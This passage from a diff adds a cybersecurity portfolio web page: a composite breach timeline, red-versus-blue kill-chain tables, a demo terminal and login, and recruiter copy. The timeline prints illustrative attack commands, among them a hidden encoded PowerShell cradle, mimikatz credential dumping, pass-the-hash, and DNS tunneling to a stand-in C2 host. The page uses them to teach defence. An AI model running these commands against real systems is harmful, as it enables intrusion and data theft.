+    <span><b class="warn">◆ SCAN</b> Global sweep targeting open RDP (3389) and MSSQL (1433)</span>
+    <span><b class="ok">● TIP</b> MFA blocks 99% of automated account attacks — enforce it everywhere</span>
+  </div>
+</div>
+
+<!-- FILE 01 — STORY -->
+<section class="blk" id="story">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 01 // THE NARRATIVE</div>
+      <h2 class="sec">Anatomy of a Breach</h2>
+      <p class="sec-sub">Every intrusion is a story with a timeline. This one is composite but faithful — assembled from real incident patterns. Scroll through the attacker's arc, then watch the defenders rewrite the ending.</p>
+    </div>
+    <div class="story-grid">
+      <div class="story-stick rv">
+        <div class="ss-time" id="ssTime">T+00:00</div>
+        <div class="ss-title" id="ssTitle">RECONNAISSANCE</div>
+        <div class="ss-count" id="ssCount">EVENT 01 / 10</div>
+        <div class="ss-meter"><i id="ssMeter"></i></div>
+        <p style="margin-top:24px;font-size:.82rem;color:var(--mut)">The red half of this story usually ends here. The blue half is why it shouldn't.</p>
+      </div>
+      <div class="beats">
+        <article class="beat rv" data-time="T+00:00" data-title="RECONNAISSANCE">
+          <div class="beat-card"><span class="beat-time">T+00:00 // RED</span><h4>The attacker maps the surface</h4>
+          <p>A threat actor runs Shodan and finds an internet-facing RDP port. LinkedIn reveals the finance team's names and email format. DNS records expose forgotten subdomains.</p>
+          <pre>shodan search "port:3389 org:target"
+theHarvester -d target.com -b linkedin,dns</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+02:14" data-title="WEAPONIZATION">
+          <div class="beat-card"><span class="beat-time">T+02:14 // RED</span><h4>The payload is built</h4>
+          <p>A phishing document is crafted with an embedded macro. A staged PowerShell download cradle is prepared — fileless, living-off-the-land, nothing malicious ever touches disk.</p>
+          <pre>powershell -nop -w hidden -enc SQBFAFgAIA...</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+06:40" data-title="DELIVERY">
+          <div class="beat-card"><span class="beat-time">T+06:40 // RED</span><h4>The spear-phish lands</h4>
+          <p>"Invoice_Q3.xlsm" arrives at a finance inbox, referencing a real vendor name scraped during recon. The sender domain is one letter off. Nobody notices.</p>
+          <pre>From: billing@target-vend0r.com  [spoofed]
+Subject: Overdue invoice — action required</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+06:52" data-title="EXPLOITATION">
+          <div class="beat-card"><span class="beat-time">T+06:52 // RED</span><h4>Enable content. Game over?</h4>
+          <p>The macro executes. Legacy AV sees only signed, native binaries. The cradle pulls the next stage straight into memory. First foothold established on FIN-WS-07.</p>
+          <pre>[EVT] winword.exe spawned powershell.exe  ⚠ unmonitored</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+09:30" data-title="PERSISTENCE">
+          <div class="beat-card"><span class="beat-time">T+09:30 // RED</span><h4>Embedding in the estate</h4>
+          <p>A scheduled task masquerading as a software updater gives the attacker a way back in. Registry run keys are set as insurance. The implant checks in over HTTPS.</p>
+          <pre>schtasks /create /tn "ChromeHealthSync" /sc hourly</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+15:10" data-title="PRIVILEGE ESCALATION">
+          <div class="beat-card"><span class="beat-time">T+15:10 // RED</span><h4>Climbing to Domain Admin</h4>
+          <p>LSASS memory is dumped and cracked offline. Pass-the-hash carries the attacker across SMB to the domain controller. Tiered admin was never implemented.</p>
+          <pre>mimikatz # sekurlsa::logonpasswords
+psexec.py target-DC01 -hashes aad3:a87f...</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+31:00" data-title="OBJECTIVE">
+          <div class="beat-card"><span class="beat-time">T+31:00 // RED</span><h4>Staging the crown jewels</h4>
+          <p>Customer records and source code are compressed with stolen admin credentials. Command-and-control hides inside high-entropy DNS queries that look like ordinary traffic.</p>
+          <pre>7z a -p archive.7z \\fileserver\finance$
+nslookup aGVsbG8.tunnel.attacker-c2.net</pre></div>
+        </article>
+        <article class="beat rv" data-time="T+38:22" data-title="EXFILTRATION">
+          <div class="beat-card"><span class="beat-time">T+38:22 // RED</span><h4>2.3 GB leaves the building</h4>
+          <p>Data exits over port 443 to a legitimate cloud storage service — indistinguishable from normal business traffic. The ransomware timer is set for Friday, 02:00.</p>
+          <pre>POST https://cdn-storage.example /upload  [encrypted]</pre></div>
+        </article>
+        <article class="beat blue rv" data-time="T+41:05" data-title="DETECTION">
+          <div class="beat-card"><span class="beat-time">T+41:05 // BLUE</span><h4>The SOC lights up</h4>
+          <p>The SIEM correlates two "small" events: an anomalous LSASS access and a spike in DNS query entropy. Alone, each was noise. Together, they are a signature. An analyst picks up the alert.</p>
+          <pre>SPL: index=endpoint event="lsass_access" | stats count by host  → 4σ spike</pre></div>
+        </article>
+        <article class="beat blue rv" data-time="T+43:40" data-title="CONTAINMENT">
+          <div class="beat-card"><span class="beat-time">T+43:40 // BLUE</span><h4>Isolate, revoke, choke</h4>
+          <p>EDR network-isolates FIN-WS-07. The compromised DC is segmented. All Kerberos tickets invalidated, sessions revoked, egress to the C2 domain blocked at the proxy.</p>
+          <pre>krbtgt reset ×2 | firewall deny c2.attacker.net | host quarantine</pre></div>
+        </article>
+        <article class="beat blue rv" data-time="T+47:00" data-title="RECOVERY & HUNT">
+          <div class="beat-card"><span class="beat-time">T+47:00 // BLUE</span><h4>The ending gets rewritten</h4>
+          <p>Credentials rotated, systems rebuilt from clean images, gaps patched with SLA timers attached. The attacker's TTPs are mapped to MITRE ATT&CK and shared to MISP so the next defender starts ahead.</p>
+          <pre>ATT&CK: T1566.001, T1059.001, T1003.001 → pushed to MISP feed</pre></div>
+        </article>
+      </div>
+    </div>
+    <div class="story-turn rv">▼ SAME SEVEN PHASES. TWO VERY DIFFERENT PLAYBOOKS. ▼</div>
+  </div>
+</section>
+
+<!-- FILE 02 — DUAL PATH -->
+<section class="blk alt" id="dual">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 02 // OFFENSE × DEFENSE</div>
+      <h2 class="sec">The Dual Path</h2>
+      <p class="sec-sub">Every phase of the kill chain has a mirror image. The attacker's move, the defender's counter — and how an <b style="color:var(--gr)">ethical hacker</b> runs the same attack legally, with a signed scope, to prove the defense works.</p>
+    </div>
+    <div class="duel-legend rv"><span><i style="background:var(--red)"></i>ATTACKER TTP</span><span><i style="background:var(--gr)"></i>DEFENDER CONTROL</span></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Passive OSINT: LinkedIn, job postings, GitHub leaks</li><li>Active scanning: <code>nmap</code>, <code>Shodan</code>, DNS brute-force</li><li>Google dorking for exposed panels & backups</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 01</span><h3>Reconnaissance</h3><p>Mapping the attack surface before touching it.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>External exposure audits + continuous ASM monitoring</li><li>Honeypots & canary tokens to spot probing</li><li>Ethical pentest repeats the recon — with written authorization — and reports every gap</li></ul></div></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Craft macro documents, packers & obfuscated loaders</li><li>Buy/rent exploit kits and initial-access brokers</li><li>Match payloads to discovered versions (CVE lookup)</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 02</span><h3>Weaponization</h3><p>Pairing an exploit with a payload.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>Threat-intel feeds mapped to MITRE ATT&CK</li><li>Sandbox detonation of suspicious samples</li><li>Purple-team exercises replay known TTPs against live controls</li></ul></div></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Spear-phish with harvested context</li><li>Malicious ads, poisoned downloads, USB drops</li><li>Supply-chain: compromise the update, not the target</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 03</span><h3>Delivery</h3><p>Getting the payload to a victim.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>Email auth: <code>SPF / DKIM / DMARC</code> enforced</li><li>URL rewriting, attachment sandboxing, safe-links</li><li>Security awareness training with realistic phishing sims</li></ul></div></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Macros, unpatched CVEs, deserialization bugs</li><li>Web attacks: SQLi, XSS → session theft</li><li>Fileless execution to dodge signature AV</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 04</span><h3>Exploitation</h3><p>Turning a vector into code execution.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>Patch SLAs + attack-surface reduction rules</li><li>WAF, parameterized queries, input validation</li><li>EDR with behavioral detection, not just signatures</li></ul></div></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Scheduled tasks, registry run keys, WMI events</li><li>Abuse valid accounts — the quietest backdoor</li><li>Implant check-ins over HTTPS / DNS to blend in</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 05</span><h3>Persistence</h3><p>Surviving reboots and password resets.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>Endpoint hardening + application allowlisting</li><li>Baseline monitoring: <code>Sysmon</code>, <code>osquery</code></li><li>Credential hygiene: rotation, vaulting, least privilege</li></ul></div></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Dump LSASS → pass-the-hash with <code>Mimikatz</code></li><li>RDP/PSExec hops toward the domain controller</li><li>Golden ticket attacks to own identity itself</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 06</span><h3>Lateral Movement</h3><p>From one workstation to the keys of the kingdom.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>LSA protection, Credential Guard, tiered admin model</li><li>Network segmentation & privileged-access workstations</li><li>NTA anomaly detection on east-west traffic</li></ul></div></div>
+
+    <div class="duel rv"><div class="duel-side red"><h5>Red // How attackers think</h5><ul>
+      <li>Stage archives, exfil over 443 / DNS tunneling</li><li>Ransomware deploy as leverage or distraction</li><li>Sell access; return later with new credentials</li></ul></div>
+      <div class="duel-core"><span class="duel-num">PHASE 07</span><h3>Actions on Objectives</h3><p>Theft, destruction, or extortion.</p></div>
+      <div class="duel-side blue"><h5>Blue // How defenders respond</h5><ul>
+      <li>Egress filtering + DLP on sensitive data classes</li><li>SIEM correlation, tested IR playbooks, backups offline</li><li>Post-incident: lessons learned → controls → shared intel</li></ul></div></div>
+  </div>
+</section>
+
+<!-- FILE 03 — ARSENAL -->
+<section class="blk" id="arsenal">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 03 // THE ARSENAL</div>
+      <h2 class="sec">Tools of the Trade</h2>
+      <p class="sec-sub">Forty real, industry-standard tools across eight domains of security — what each does and what running it actually looks like. This is the practical layer behind the story.</p>
+    </div>
+    <div class="tabs rv" id="tabs" role="tablist"></div>
+    <div id="panels"></div>
+  </div>
+</section>
+
+<!-- FILE 04 — SKILLS -->
+<section class="blk alt" id="skills">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 04 // FIELD MANUAL</div>
+      <h2 class="sec">Capabilities & Doctrine</h2>
+      <p class="sec-sub">Honest self-assessment, project-backed — plus the operating principles every engagement runs on.</p>
+    </div>
+    <div class="skill-grid">
+      <div class="rv">
+        <div class="bar-row"><div class="bar-top"><span>Reconnaissance & OSINT</span><span class="pct">90%</span></div><div class="bar"><i data-w="90"></i></div></div>
+        <div class="bar-row"><div class="bar-top"><span>Network Security & Traffic Analysis</span><span class="pct">85%</span></div><div class="bar"><i data-w="85"></i></div></div>
+        <div class="bar-row"><div class="bar-top"><span>Blue Team / SIEM / Detection</span><span class="pct">82%</span></div><div class="bar"><i data-w="82"></i></div></div>
+        <div class="bar-row red"><div class="bar-top"><span>Web Application Pentesting</span><span class="pct">80%</span></div><div class="bar"><i data-w="80"></i></div></div>
+        <div class="bar-row"><div class="bar-top"><span>Incident Response & Forensics</span><span class="pct">78%</span></div><div class="bar"><i data-w="78"></i></div></div>
+        <div class="bar-row red"><div class="bar-top"><span>Cloud Security (AWS / Azure)</span><span class="pct">75%</span></div><div class="bar"><i data-w="75"></i></div></div>
+        <div class="bar-row"><div class="bar-top"><span>Cryptography Applied</span><span class="pct">70%</span></div><div class="bar"><i data-w="70"></i></div></div>
+        <div class="bar-row red"><div class="bar-top"><span>Malware Analysis (static)</span><span class="pct">65%</span></div><div class="bar"><i data-w="65"></i></div></div>
+        <div class="principles">
+          <span class="stamp">Assume Breach</span><span class="stamp">Zero Trust</span><span class="stamp">Least Privilege</span><span class="stamp">Defense in Depth</span><span class="stamp">Secure by Design</span>
+        </div>
+      </div>
+      <div class="rv d2">
+        <div class="radar" aria-hidden="true">
+          <span class="blip" style="top:26%;left:62%"></span>
+          <span class="blip" style="top:64%;left:30%;animation-delay:1.1s"></span>
+          <span class="blip g" style="top:44%;left:70%;animation-delay:2s"></span>
+          <span class="blip" style="top:70%;left:66%;animation-delay:.6s"></span>
+        </div>
+        <div class="road">
+          <h4>Certification Roadmap — honest status</h4>
+          <div class="road-item"><span>CompTIA Security+</span><span class="chip gr st">DONE</span></div>
+          <div class="road-item"><span>TryHackMe / HTB labs — 200+ hrs</span><span class="chip gr st">DONE</span></div>
+          <div class="road-item"><span>eJPT — Junior Penetration Tester</span><span class="chip am st">IN PROGRESS</span></div>
+          <div class="road-item"><span>OSCP — Offensive Security</span><span class="chip st">NEXT</span></div>
+          <div class="road-item"><span>BSCP / CCSP</span><span class="chip st">PLANNED</span></div>
+        </div>
+        <p style="margin-top:22px;font-size:.82rem;color:var(--mut)">This page itself is a lab artifact: Three.js attack-globe visualization, client-side SHA-256 auth demo, rate-limited login, and a hand-built SOC terminal — source on GitHub, no frameworks.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FILE 05 — CONSOLE -->
+<section class="blk" id="console">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 05 // LIVE ENVIRONMENT</div>
+      <h2 class="sec">The SOC Console</h2>
+      <p class="sec-sub">A working terminal — command parser, history, simulated scans, live SHA-256 hashing. Try <kbd>help</kbd>, then try <kbd>sudo hireme</kbd>.</p>
+    </div>
+    <div class="term frame rv">
+      <div class="term-head"><span class="sq r" style="width:9px;height:9px;background:var(--red)"></span><span class="sq a" style="width:9px;height:9px;background:var(--amber)"></span><span class="sq g" style="width:9px;height:9px;background:var(--gr)"></span>&nbsp;<span class="mono" style="font-size:.68rem;color:var(--mut2);letter-spacing:.14em">operator@sentinel: ~/field-manual</span></div>
+      <div class="term-body" id="tOut" aria-live="polite"></div>
+      <div class="term-line" style="padding:0 20px 16px"><span class="ps">operator@sentinel:~$&nbsp;</span><input id="tIn" autocomplete="off" spellcheck="false" aria-label="terminal input"></div>
+    </div>
+    <div class="qcmds rv d1">
+      <button class="qcmd">help</button><button class="qcmd">story</button><button class="qcmd">skills</button>
+      <button class="qcmd">scan 10.10.14.7</button><button class="qcmd">nmap target.corp</button><button class="qcmd">hash password123</button>
+      <button class="qcmd">tools web</button><button class="qcmd">matrix</button><button class="qcmd">sudo hireme</button>
+    </div>
+  </div>
+</section>
+
+<!-- FILE 06 — LOGIN -->
+<section class="blk alt" id="login">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 06 // SECURE GATEWAY</div>
+      <h2 class="sec">Authentication, Done Right</h2>
+      <p class="sec-sub">A login flow is a security control, not a form. This demo runs entirely in your browser and demonstrates the concepts real systems implement.</p>
+    </div>
+    <div class="login-grid">
+      <ul class="edu rv">
+        <li data-n="01"><b>Never store plaintext.</b> Watch the SHA-256 digest update live as you type. Production systems hash server-side with salted, slow algorithms — <b>bcrypt / scrypt / Argon2id</b>.</li>
+        <li data-n="02"><b>Rate-limit everything.</b> This form locks out after 5 failed attempts for 10 seconds — the same principle behind account lockout policies and WAF throttling.</li>
+        <li data-n="03"><b>Uniform error messages.</b> "Invalid credentials" — never reveal whether the email exists. User enumeration is a real attack class.</li>
+        <li data-n="04"><b>Defense in depth.</b> Real deployments add MFA, device posture checks, session binding, and anomaly detection on top.</li>
+      </ul>
+      <div class="frame login-box rv d2" id="loginBox">
+        <div id="loginForm">
+          <div class="lb-row"><label for="lEmail">Operator ID (email)</label>
+            <input id="lEmail" type="email" placeholder="operator@sentinel.ops" autocomplete="off"></div>
+          <div class="lb-row"><label for="lPass">Passphrase</label>
+            <input id="lPass" type="password" placeholder="••••••••••••" autocomplete="off">
+            <div class="meter" id="pMeter"><i></i><i></i><i></i><i></i></div>
+            <div class="hashbox" id="hashBox">SHA-256: awaiting input…</div></div>
+          <button class="btn solid" id="lBtn" style="width:100%;justify-content:center">[ AUTHENTICATE ]</button>
+          <div class="login-msg" id="lMsg"></div>
+          <p style="margin-top:16px;font-family:var(--mono);font-size:.66rem;color:var(--mut)">DEMO CREDENTIALS → <button class="copybtn" id="fillCreds">AUTOFILL: operator / letmein2026</button><br>Client-side demo only — nothing leaves this page.</p>
+        </div>
+        <div class="granted" id="granted">
+          <div class="g-head">▮ ACCESS GRANTED</div>
+          <p class="mono" style="font-size:.66rem;color:var(--mut);letter-spacing:.2em">SESSION TOKEN ISSUED · TLS SIMULATED · MFA RECOMMENDED</p>
+          <div class="g-cards">
+            <div class="g-card"><div class="v">L3</div><div class="k">Clearance</div></div>
+            <div class="g-card"><div class="v" style="color:var(--amber)">ELEVATED</div><div class="k">Threat level</div></div>
+            <div class="g-card"><div class="v">3</div><div class="k">Active hunts</div></div>
+          </div>
+          <p class="g-brief">BRIEFING: VORTEX phishing kit infrastructure expanded overnight. Two client honeypots captured fresh samples. SOC rotation starts at you. Review the MISP feed, then push your detection rules before stand-up.</p>
+          <button class="btn" id="logout" style="margin-top:20px">[ TERMINATE SESSION ]</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FILE 07 — CONTACT -->
+<section class="blk" id="contact">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 07 // SECURE CHANNEL</div>
+      <h2 class="sec">Open a Channel</h2>
+      <p class="sec-sub">Hiring for a security team, SOC, or pentest crew — or want to collaborate on a CTF? The channel is open and encrypted in transit.</p>
+    </div>
+    <div class="contact-grid">
+      <div class="rv">
+        <div class="chan"><span class="k">Email</span><span class="v" id="cEmail">—</span><button class="copybtn" id="copyMail">COPY</button></div>
+        <div class="chan"><span class="k">GitHub</span><span class="v" id="cGit">—</span><button class="copybtn" onclick="copyTxt(document.getElementById('cGit').textContent,'GitHub link copied')">COPY</button></div>
+        <div class="chan"><span class="k">LinkedIn</span><span class="v" id="cLin">—</span><button class="copybtn" onclick="copyTxt(document.getElementById('cLin').textContent,'LinkedIn link copied')">COPY</button></div>
+        <div class="chan"><span class="k">PGP fingerprint</span><span class="v" style="color:var(--cyan)">4A2F 91C0 DE7B 33F8 SENT INEL 0000</span></div>
+        <div class="chan"><span class="k">Response SLA</span><span class="v">&lt; 24 hours, any timezone</span></div>
+        <p style="margin-top:22px;font-size:.82rem;color:var(--mut)">The form composes a pre-filled email in your mail client — no backend, no tracking, no data stored. That's a privacy feature, not a missing feature.</p>
+      </div>
+      <form class="frame cform rv d2" id="cForm">
+        <div class="lb-row"><label for="cName">Your name</label><input id="cName" required placeholder="Jane Recruiter"></div>
+        <div class="lb-row"><label for="cFrom">Reply-to email</label><input id="cFrom" type="email" required placeholder="jane@company.com"></div>
+        <div class="lb-row"><label for="cBody">Transmission</label>
+          <textarea id="cBody" rows="5" required style="width:100%;background:#050a10;border:1px solid var(--line);color:#eafff3;font-family:var(--mono);font-size:.85rem;padding:13px 14px;outline:none;resize:vertical" placeholder="We're hiring a junior security analyst and your kill-chain breakdown impressed us…"></textarea></div>
+        <button class="btn solid" type="submit" style="width:100%;justify-content:center">[ ENCRYPT & TRANSMIT ]</button>
+        <div class="mail-prev" id="mailPrev"></div>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- FILE 08 — SHOWCASE KIT -->
+<section class="blk alt" id="kit">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow">FILE 08 // SHOWCASE KIT</div>
+      <h2 class="sec">Take This to Recruiters</h2>
+      <p class="sec-sub">Pre-written copy for LinkedIn and your GitHub README. Paste, personalize, publish. Then host it free on GitHub Pages and pin it everywhere.</p>
+    </div>
+    <div class="kit-grid">
+      <div class="kit-card frame rv"><h4>LinkedIn post <button class="copybtn" id="copyLi">COPY POST</button></h4><pre id="liPost">🔐 I didn't just study cybersecurity — I built a working demo of it.
+
+I designed and shipped a fully interactive security operations experience from scratch: vanilla HTML/CSS/JS + Three.js, zero frameworks.
+
+→ Live 3D globe visualizing global attack traffic in real time
+→ Full kill-chain walkthrough: attacker TTPs vs blue-team controls
+→ 40+ real tools mapped across 8 domains (network, web, cloud, endpoint, crypto, SOC, OSINT, mobile/IoT)
+→ A working SOC terminal with real command parsing
+→ SHA-256 client-side auth demo with rate limiting & lockout
+→ A complete breach story, T+00:00 to T+47:00 containment
+
+It's proof of practical, applied knowledge — not just certificates.
+
+🔗 Live demo: [PASTE YOUR LINK]
+💻 Source: github.com/[YOU]/sentinel-ops
+
+#cybersecurity #ethicalhacking #blueteam #redteam #infosec #opentowork</pre></div>
+      <div class="kit-card frame rv d2"><h4>GitHub README intro <button class="copybtn" id="copyRd">COPY README</button></h4><pre id="rdPost"># SENTINEL//OPS — Interactive Cybersecurity Field Manual 🛰️
+
+A story-driven, 3D security operations experience built with
+vanilla JavaScript + Three.js. No frameworks. One file.
+
+- 🌍 Real-time-style attack globe (Three.js arcs, particle field)
+- 📖 "Anatomy of a Breach" — a full incident timeline, T+00 → T+47
+- ⚔️ Red vs Blue kill-chain: attacker TTPs vs defender controls
+- 🧰 40+ real tools across 8 security domains, with sample commands
+- 💻 Hackable demo terminal (command parser, history, fake nmap)
+- 🔐 SHA-256 login demo — hashing, rate limiting, lockout explained
+
+**Why it exists:** to demonstrate practical, applied security
+knowledge through something you can actually touch.
+
+🔗 Live: [YOUR GITHUB PAGES URL]
+
+## Stack
+HTML · CSS · Vanilla JS · Three.js r128 · Web Crypto API</pre></div>
+    </div>
+    <div class="steps rv">
+      <div class="step"><b>01 // Ship it</b>Create a GitHub repo, upload this file as <span class="mono">index.html</span>, push.</div>
+      <div class="step"><b>02 // Host it</b>Repo → Settings → Pages → Deploy from branch <span class="mono">main</span>. Free HTTPS URL in ~1 minute.</div>
+      <div class="step"><b>03 // Flaunt it</b>Post the LinkedIn copy, add the link to your Featured section, CV header, and pinned repo.</div>
+      <div class="step"><b>04 // Talk it</b>In interviews: explain the kill chain, the hashing demo, and one tool per domain. You built it — own it.</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-big rv">STAY PARANOID.<br>STAY PREPARED.</div>
+    <div class="foot-row">
+      <span>© <span id="year"></span> <span id="fName">SENTINEL//OPS</span> — built by hand, no frameworks</span>
+      <span><a href="#top">TOP</a> · <a href="#story">STORY</a> · <a href="#arsenal">ARSENAL</a> · <a href="#console">CONSOLE</a> · <a href="#kit">KIT</a></span>
+      <span id="fBuild">BUILD 2026.08.14 · NODE ONLINE</span>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function(){
+"use strict";
+/* ══════════ EDIT ME — your identity ══════════ */
+const CFG = {
+  name:     "YOUR NAME",                    // ← your name
+  role:     "Security Researcher & Builder",// ← your title
+  email:    "you@protonmail.com",           // ← your email
+  github:   "https://github.com/your-username",
+  linkedin: "https://linkedin.com/in/your-username"
+};
+/* ═════════════════════════════════════════════ */
+const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
+const RM = matchMedia('(prefers-reduced-motion: reduce)').matches;
+document.getElementById('year').textContent = new Date().getFullYear();
+$('#cEmail').textContent=CFG.email; $('#cGit').textContent=CFG.github; $('#cLin').textContent=CFG.linkedin;
+$('#fName').textContent = CFG.name.toUpperCase()+" // SENTINEL OPS";
+
+/* toast */
+let toastT; window.toast=(m,err)=>{const t=$('#toast');t.textContent=m;t.classList.toggle('err',!!err);t.classList.add('on');clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('on'),2600);};
+window.copyTxt=async(t,msg)=>{try{await navigator.clipboard.writeText(t);toast(msg||'COPIED TO CLIPBOARD');}catch(e){toast('COPY FAILED — SELECT MANUALLY',1);}};
+
+/* boot */
+const bootLines=["SENTINEL/OPS v3.1 — SECURE BOOT","> loading kernel modules ........ OK","> mounting encrypted volumes .... OK","> verifying operator identity ... OK","> starting threat intel feed .... ONLINE","> ACCESS GRANTED — WELCOME, OPERATOR"];
+const boot=$('#boot');
+if(RM){boot.classList.add('off');}
+else{let bi=0;const bEl=$('#bootTxt');
+  const step=()=>{ if(bi<bootLines.length){bEl.textContent+=bootLines[bi++]+"\n";setTimeout(step,190);} else setTimeout(()=>boot.classList.add('off'),350); };
+  step(); boot.addEventListener('click',()=>boot.classList.add('off'));
+  setTimeout(()=>boot.classList.add('off'),2600);}
+
+/* clocks */
+const clk=()=>{const d=new Date();const p=n=>String(n).padStart(2,'0');const s=p(d.getUTCHours())+":"+p(d.getUTCMinutes())+":"+p(d.getUTCSeconds());const c=$('#clock');if(c)c.textContent=s+" UTC";const f=$('#feedClock');if(f)f.textContent=s+" UTC";};
+clk(); setInterval(clk,1000);
+
+/* nav */
+$('#menuBtn').addEventListener('click',()=>$('#navDrop').classList.toggle('open'));
+$$('#navDrop a').forEach(a=>a.addEventListener('click',()=>$('#navDrop').classList.remove('open')));
+
+/* duplicate ticker */
+const tt=$('#tickTrack'); tt.innerHTML+=tt.innerHTML;
+
+/* reveal + scramble + bars */
+const io=new IntersectionObserver(es=>es.forEach(e=>{if(!e.isIntersecting)return;const el=e.target;el.classList.add('in');
+  if(el.dataset.scramble&&!RM){scramble(el,el.dataset.scramble);el.removeAttribute('data-scramble');}
+  el.querySelectorAll('.bar i').forEach(b=>b.style.width=b.dataset.w+'%');
+  io.unobserve(el);}),{threshold:.18});
+$$('.rv').forEach(el=>io.observe(el));
+function scramble(el,txt){const ch='█▓▒░<>/|=+*#01';let f=0;const iv=setInterval(()=>{f++;el.textContent=txt.split('').map((c,i)=>i<f-3?c:(c===' '?' ':ch[Math.random()*ch.length|0])).join('');if(f-3>=txt.length){clearInterval(iv);el.textContent=txt;}},26);}
+
+/* counters */
+const cio=new IntersectionObserver(es=>es.forEach(e=>{if(!e.isIntersecting)return;const el=e.target,end=+el.dataset.count;let v=0;const st=Math.max(1,Math.round(end/40));
+  if(RM){el.textContent=end;}else{const iv=setInterval(()=>{v+=st;if(v>=end){v=end;clearInterval(iv);}el.textContent=v;},34);}cio.unobserve(el);}),{threshold:.6});
+$$('[data-count]').forEach(el=>cio.observe(el));
+
+/* live feed */
+const feedPool=[
+ ['ok','firewall rules synced — 214 rules verified'],['warn','port 3389 exposed on edge-04 — flag for review'],
+ ['crit','brute-force detected from 203.0.113.77 → ssh'],['ok','IOC feed updated — 1,204 new hashes ingested'],
+ ['sys','honeypot-net: 3 new sessions captured'],['warn','TLS cert on mail.target.com expires in 6 days'],
+ ['crit','anomalous LSASS access on FIN-WS-07'],['ok','EDR definitions updated across 412 endpoints'],
+ ['sys','osquery fleet poll complete — 0 drift detected'],['warn','DMARC p=none on legacy subdomain — tighten'],
+ ['ok','MISP galaxy sync complete — 88 new clusters'],['crit','DNS entropy spike on subnet 10.20.4.0/24'],
+ ['sys','SIEM correlation rule #217 fired — queued'],['ok','patch window closed — 97% coverage achieved'],
+ ['warn','unusual login geo: operator account, 03:12 UTC'],['ok','backup integrity check passed — 3 vaults verified']];
+const fb=$('#feedBody'); let fi=0;
+function feedLine(){const [t,m]=feedPool[fi++%feedPool.length];const d=new Date(),p=n=>String(n).padStart(2,'0');
+  const div=document.createElement('div');div.className='fl '+t;
+  div.innerHTML='<span class="t">'+p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())+'</span> ['+t.toUpperCase()+'] '+m;
+  fb.appendChild(div); while(fb.children.length>13)fb.removeChild(fb.firstChild);}
+for(let i=0;i<12;i++)feedLine();
+if(!RM)setInterval(()=>{if(!document.hidden)feedLine();},1400);
+
+/* story sticky sync */
+const beats=$$('.beat');
+const bio=new IntersectionObserver(es=>es.forEach(e=>{if(!e.isIntersecting)return;const b=e.target;
+  $('#ssTime').textContent=b.dataset.time; $('#ssTitle').textContent=b.dataset.title;
+  const idx=beats.indexOf(b)+1; $('#ssCount').textContent='EVENT '+String(idx).padStart(2,'0')+' / '+beats.length;
+  $('#ssMeter').style.transform='scaleX('+(idx/beats.length)+')';
+  $('#ssTime').style.color=b.classList.contains('blue')?'var(--gr)':'var(--red)';
+}),{rootMargin:'-40% 0px -50% 0px'});
+beats.forEach(b=>bio.observe(b));
+
+/* arsenal */
+const DOMAINS=[
+ {id:'net',ico:'◈',name:'Network',desc:'Network security is the backbone — discover what is exposed, watch what flows, and block what should never have been reachable. These are the tools every SOC and pentest starts with.',tools:[
+  ['Nmap','gr','The network mapper: host discovery, port scanning, service/version fingerprinting and NSE scripting.','nmap -sV -sC -p- -oA scan 10.10.10.0/24'],
+  ['Wireshark','cy','Deep packet inspection — read protocols live, follow TCP streams, spot malware beacons in cleartext.','wireshark -k -i eth0 -f "tcp port 443"'],
+  ['tcpdump','am','Lightweight CLI capture for servers and headless boxes. The analyst\u2019s stethoscope.','tcpdump -i eth0 -w capture.pcap "not port 22"'],
